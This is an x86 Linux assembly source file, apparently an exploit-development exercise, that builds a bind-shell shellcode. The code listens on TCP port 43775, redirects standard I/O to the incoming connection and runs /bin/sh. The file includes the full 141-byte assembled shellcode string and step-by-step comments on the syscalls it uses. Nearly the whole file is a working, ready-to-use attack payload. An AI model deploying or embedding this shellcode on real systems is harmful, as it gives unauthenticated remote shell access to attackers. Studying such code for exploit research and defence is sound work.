;    This program is free software: you can redistribute it and/or modify
;    it under the terms of the GNU General Public License as published by
;    the Free Software Foundation, either version 3 of the License, or
;    (at your option) any later version.
;
;    This program is distributed in the hope that it will be useful,
;    but WITHOUT ANY WARRANTY; without even the implied warranty of
;    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;    GNU General Public License for more details.
;
;    You should have received a copy of the GNU General Public License
;    along with this program.  If not, see <http://www.gnu.org/licenses/>.

; Filename: shell_bind_tcp.nasm
; Author: Andrey Arapov <andrey.arapov@gmail.com>
; 2013 March
;
; DESC:
; - Binds to a port 43775
; - Execs Shell on incoming connection
;
;
; Shellcode size: 141 bytes
; Shellcode "\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xc9\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xeb\x6d\x5f\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xd2\x52\x66\xff\x37\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x6a\x01\x56\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xd2\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc0\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\x31\xc0\xb0\x0b\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xcd\x80\xe8\x8e\xff\xff\xff\xaa\xff"
;
; Port is the last two bytes of the shellcode. In hex \xaa\xff  (0xaaff = 43775)
;
;
;

global _start


section .text

_start:
	;
	; Reverse engineering
	;
	; 1. Found a program that can listen over TCP/IP and strace it in order to find needed syscalls
	; $ strace nc -l 31111 2>&1 |grep -Ev "mmap|munmap|mprotect|access|read|open|fstat|close|arch_prctl"
	; ...
	; socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
	; bind(3, {sa_family=AF_INET, sin_port=htons(31111), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
	; listen(3, 1)                            = 0
	;
	;
	; 2. Found a syscall for socket
	; $ grep -i socket /usr/include/asm/unistd_32.h
	; #define __NR_socketcall		102
	;
	;
	; 3. Read manual for socket system calls (man 2 socketcall)
	; int socketcall(int call, unsigned long *args)
	;
	; The manual for socketcall does not tell much :/
	; Thus found a good description here:
	;   http://www.tutorialspoint.com/unix_sockets/socket_core_functions.htm
	;
	;
	; 4. From nc strace I need socket, bind and listen
	; Below is the list of functions and their call numbers for socketcall
	; $ grep -Ei "socket|bind|listen|accept" /usr/include/linux/net.h |grep define |head -4
	; #define SYS_SOCKET	1		/* sys_socket(2)		*/
	; #define SYS_BIND	2		/* sys_bind(2)			*/
	; #define SYS_LISTEN	4		/* sys_listen(2)		*/
	; #define SYS_ACCEPT	5		/* sys_accept(2)		*/
	;
	; Also I found a list of functions (or call numbers) for socketcall
	; $ grep SYS_ /usr/include/linux/net.h
	;
	;
	; 5. Found parameters for socket
	; $ grep -Ew "AF_INET|PF_INET|SOCK_STREAM" /usr/include/bits/socket.h
	;   SOCK_STREAM = 1,		/* Sequenced, reliable, connection-based
	; #define	PF_INET		2	/* IP protocol family.  */
	; #define	AF_INET		PF_INET
	;
	; $ grep IPPROTO_TCP /usr/include/netinet/in.h |head -1
	; IPPROTO_TCP = 6,	   /* Transmission Control Protocol.  */
	;
	;

	;
	; Starting to code
	;

	;
	; =============================== SOCKET =====================================
	;
	; int socket(int domain, int type, int protocol);
	;
	; int socketcall(int call, unsigned long *args)
	; socketcall	SYS_SOCKET	socket() args
	; EAX		EBX		ECX
	; 102		1		(2, 1, 6)
	;
	; SYS_SOCKET will return file descriptor (fd) in EAX.
	;

	; EAX
	xor eax, eax
	mov al, 102		; socketcall

	; EBX
	xor ebx, ebx
	mov bl, 1		; SYS_SOCKET socket()

	; ECX
	xor ecx, ecx
	push ecx
	push BYTE 6		; IPPROTO_TCP	|| 	int protocol);
	push BYTE 1		; SOCK_STREAM	|| 	int type,
	push BYTE 2		; AF_INET	|| socket(int domain,
	mov ecx, esp		; ECX - PTR to arguments for socket()
	int 0x80

	; EAX return
	mov esi, eax		; save socket fd in ESI for later



	;
	; =============================== BIND =======================================
	;
	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	;
	; int socketcall(int call, unsigned long *args)
	; socketcall	SYS_BIND	bind() args
	; EAX,		EBX,		ECX
	; 102		2		(sockfd, {2, 43775, 0}, 16)
	;

	jmp short call_get_port
port_in_esp:
	pop edi			; getting port address from ESP

	; EAX
	xor eax, eax
	mov al, 102		; socketcall

	; EBX
	xor ebx, ebx
	mov bl, 2		; SYS_BIND bind()

	; ECX
	xor edx, edx
	push edx		; ANY HOST (0.0.0.0)}			||		struct in_addr sin_addr (unsigned long s_addr) };
	;push DWORD 0x0100007f	; For 127.0.0.1 HOST
	;push WORD 0xffaa	; PORT 43775 (reverse),			||	 	unsigned short sin_port,
	push WORD [edi]		; PORT specified in the bottom of the code / shellcode. Last two bytes in HEX.

	push WORD bx		; 2 - AF_INET				|| struct sockaddr { short sin_family,
	mov ecx, esp		; Save PTR to sockaddr struct in ECX

	push BYTE 16		; 	socklen_t addrlen);
	push ecx		; 	const struct sockaddr *addr,
	push esi		; bind(int sockfd,
	mov ecx, esp		; ECX = PTR to arguments for bind()
	int 0x80



	;
	; =============================== LISTEN =====================================
	;
	; int listen(int sockfd, int backlog);
	;
	; int socketcall(int call, unsigned long *args)
	; socketcall	SYS_LISTEN	listen() args
	; EAX,		EBX,		ECX
	; 102		4		(sockfd, 1)
	;

	; EAX
	xor eax, eax
	mov al, 102		; socketcall

	; EBX
	xor ebx, ebx
	mov bl, 4		; SYS_LISTEN listen()

	; ECX
	push BYTE 1		; 	int backlog);
	push esi		; listen(int sockfd,
	mov ecx, esp		; ECX = PTR to arguments for listen()
	int 0x80



	;
	; =============================== ACCEPT =====================================
	;
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	;
	; int socketcall(int call, unsigned long *args)
	; socketcall	SYS_ACCEPT	accept() args
	; EAX,		EBX,		ECX
	; 102		5		(sockfd, NULL, 0)
	;

	; EAX
	xor eax, eax
	mov al, 102		; socketcall

	; EBX
	xor ebx, ebx
	mov bl, 5		; SYS_ACCEPT = accept()

	; ECX
	xor edx, edx
	push edx		; 	socklen_t *addrlen = 0);
	push edx		; 	struct sockaddr *addr = NULL,
	push esi		; listen(int sockfd,
	mov ecx, esp		; ECX = PTR to arguments for accept()
	int 0x80



	;
	; =============================== DUP FD =====================================
	;
	; Before we spawn a shell, we need to forward all I/O (stdin,stdout,stderr)
	; to a client. For this, we can dup2 syscall to duplicate a file descriptor.
	; man 2 dup2
	; int dup2(int oldfd, 		int newfd);
	; EAX,		EBX,		ECX
	; 63		sockfd		0
	; 63		sockfd		1
	; 63		sockfd		2
	;

	; move our sockfd to EBX
	mov ebx, eax

	xor eax, eax
	mov al, 63		; dup2 syscall
	xor ecx, ecx		; 0 - stdin
	int 0x80		; call dup2(sockfd, 0)

	mov al, 63		; dup2 syscall
	mov cl, 1		; 1 - stdout
	int 0x80		; call dup2(sockfd, 1)

	mov al, 63		; dup2 syscall
	mov cl, 2		; 2 - stderr
	int 0x80		; call dup2(sockfd, 2)



	;
	; =============================== EXECVE =====================================
	;
	; Now as we forwarded sockfd to a client, we can spawn shell.
	; Prepare the path, in little-endian, using the Python
	; >>> '//bin/sh'[::-1].encode('hex')
	; '68732f6e69622f2f'
	;
	; int execve(const char *filename, char *const argv[], char *const envp[]);
	; EAX		EBX,			ECX,		EDX
	; 11		'//bin/sh'		PTR to EBX	NULL
	;
	;

	; EAX
	xor eax, eax
	mov al, 11		; execve syscall

	; EBX
	xor edx, edx
	push edx		; NULL termination of '//bin/sh' string
	push 0x68732f6e		; '//bin/sh' in reverse
	push 0x69622f2f		; beginning of '//bin/sh' string is here
	mov ebx, esp		; put the address of '//bin/sh' into ebx via esp

	; ECX
	push edx		; NULL termination of a stack
	push ebx		; load our '//bin/sh' on a stack
	mov ecx, esp		; ECX is a PTR to stack where we've got EBX address to '//bin/sh' string.

	; EDX
	push edx		; NULL terminator
	mov edx, esp		; EDX is a PTR to a stack which has an address to NULL.
	int 0x80		; call execve(EBX, ECX, EDX)



	;
	; =============================== EXIT(0) =====================================
	;
	; As long as 'man 2 execve' tells us
	; execve() does not return on success, and the text, data, bss, and stack of
	; the calling process are overwritten by that of the program loaded.
	; We can keep it *COMMENTED*.
	;
	; void _exit(int status);
	; EAX		EBX
	; 1		0
	;
	; /usr/include/asm/unistd_32.h:#define __NR_exit		  1
	; xor eax, eax
	; mov al, 1	; exit syscall
	; xor ebx, ebx	; 0 code means success
	; int 0x80
	;

call_get_port:
	call port_in_esp
;	dw 0xffaa		; WORD (43775 in reverse hex)
	db 0xaa, 0xff		; BYTE (43775 in straight hex)
